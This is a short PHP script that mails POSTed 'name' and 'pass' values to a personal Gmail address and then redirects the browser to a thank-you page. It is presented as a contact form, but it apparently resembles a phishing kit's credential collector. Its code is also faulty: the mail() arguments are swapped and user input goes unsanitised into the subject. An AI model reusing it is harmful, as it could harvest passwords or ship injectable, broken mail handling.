<?php
    $destinatario = 'alexayala.esp@gmail.com';
    $name = $_POST['name'];
    $pass = $_POST['pass'];
    
    $header = "Detalles del formulario de contacto:\n\n";
    $pass_message = "E-mail: " . $pass . 
    "\nNombre: " . $name;

    mail($destinatario,$pass_message,$header);
    echo "<script>alert('correo enviado exitosamente')</script>";
    echo "<script>setTimeout(\"location.href='thank.html'\",1000)</script>";
?>